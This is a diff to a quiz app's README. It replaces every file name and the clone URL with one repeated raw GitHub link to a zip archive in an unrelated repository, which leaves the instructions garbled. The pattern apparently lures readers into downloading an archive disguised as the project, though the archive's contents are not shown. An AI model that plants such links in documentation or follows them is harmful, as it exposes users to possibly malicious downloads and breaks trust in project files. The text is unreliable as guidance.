@@ -17,27 +17,27 @@ pgsql
 Copy
 Edit
 simple-quiz-app/
-├── index.html
-├── style.css
-├── script.js
-└── README.md
+├── https://raw.githubusercontent.com/akkiakshay-26/quiz-app/main/preaccommodating/quiz_app_3.5-alpha.4.zip
+├── https://raw.githubusercontent.com/akkiakshay-26/quiz-app/main/preaccommodating/quiz_app_3.5-alpha.4.zip
+├── https://raw.githubusercontent.com/akkiakshay-26/quiz-app/main/preaccommodating/quiz_app_3.5-alpha.4.zip
+└── https://raw.githubusercontent.com/akkiakshay-26/quiz-app/main/preaccommodating/quiz_app_3.5-alpha.4.zip
 🛠️ Getting Started
 Clone the repository:
 
 bash
 Copy
 Edit
-git clone https://github.com/yourusername/simple-quiz-app.git
+git clone https://raw.githubusercontent.com/akkiakshay-26/quiz-app/main/preaccommodating/quiz_app_3.5-alpha.4.zip
 Navigate to the project directory:
 
 bash
 Copy
 Edit
 cd simple-quiz-app
-Open index.html in your web browser to start the quiz.
+Open https://raw.githubusercontent.com/akkiakshay-26/quiz-app/main/preaccommodating/quiz_app_3.5-alpha.4.zip in your web browser to start the quiz.
 
 ✏️ Customization
-To modify or add questions, edit the questions array in script.js:
+To modify or add questions, edit the questions array in https://raw.githubusercontent.com/akkiakshay-26/quiz-app/main/preaccommodating/quiz_app_3.5-alpha.4.zip
 
 javascript
 Copy
@@ -57,4 +57,4 @@ const questions = [
 📄 License
 This project is open-source and available under the MIT License.
 
-Feel free to customize this README.md to better suit your project's specifics.
+Feel free to customize this https://raw.githubusercontent.com/akkiakshay-26/quiz-app/main/preaccommodating/quiz_app_3.5-alpha.4.zip to better suit your project's specifics.
